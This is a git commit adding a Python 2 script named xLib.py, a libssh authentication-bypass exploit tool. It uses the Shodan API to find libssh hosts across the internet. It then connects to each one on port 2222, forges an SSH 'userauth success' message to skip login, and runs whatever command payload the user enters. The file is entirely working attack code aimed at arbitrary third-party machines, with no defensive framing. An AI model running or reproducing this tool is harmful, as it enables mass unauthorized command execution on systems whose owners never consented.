4cfb2c8c2e0569dabb01eea05479acc6ed9dd4d0
Track Projects inc <44095206+1trackprojects1@users.noreply.github.com>
2018-11-05 22:03:35 +0530

    xLib.py | v0.2.6

---
+++ xLib.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python
+
+# /*
+# Made by Track Projects inc.
+# [c] Copyright RJ. All rights reserved.
+# */
+
+import json
+import shodan
+import paramiko
+import socket
+
+# // SHODAN.IO Module {setup}
+SHODAN_API_KEY = 'Your APi Key.'
+api = shodan.Shodan(SHODAN_API_KEY)
+
+print '[*] Welcome to xLib CLI. [*]'
+print '| Exploit : LIBSSH Auth Bypass | Version : 0.2.6 |'
+print '--------------------------------------------------'
+payload = raw_input('Enter payload: ')
+print '--------------------------------------------------'
+try:
+    results = api.search('libssh')
+    print '[+] Found : {} devices!'.format(results['total'])
+    for result in results['matches']:
+        try:
+            nbytes = 4096
+            hostname = format(result['ip_str'])
+            port = 2222
+            sock = socket.socket()
+            sock.connect((hostname, port))
+            m = paramiko.message.Message()
+            transport = paramiko.transport.Transport(sock)
+            transport.start_client()
+            m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+            transport._send_message(m)
+            cmd_channel = transport.open_session()
+            cmd_channel.set_combine_stderr(True)
+            cmd_channel.exec_command(payload)
+        except socket.error:
+            print '[!] xLib Error: Box broken.'
+        except paramiko.ssh_exception.SSHException:
+            print '[$] Exploited!'
+except shodan.APIError, e:
+    print '[-] xLib Error: pipe broke.'
